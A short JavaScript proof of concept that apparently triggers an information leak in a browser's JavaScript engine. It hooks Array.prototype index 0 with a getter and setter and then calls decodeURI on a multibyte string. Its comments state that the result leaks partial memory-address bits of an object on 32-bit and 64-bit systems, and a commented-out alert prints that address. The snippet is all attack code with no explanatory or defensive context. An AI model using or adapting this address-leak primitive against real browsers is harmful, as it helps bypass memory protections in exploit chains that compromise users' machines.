var num = new Number(10);
Array.prototype.__defineGetter__(0,function(){
        return num;
})
Array.prototype.__defineSetter__(0,function(value){
})
var str=decodeURI("%E7%9A%84");
//in 32bit system, the leaked bits is [31..16]
////in 64bit system, the leaked bits is [47..32]
//alert("partial address of object num is "+str.charCodeAt(0).toString(16));
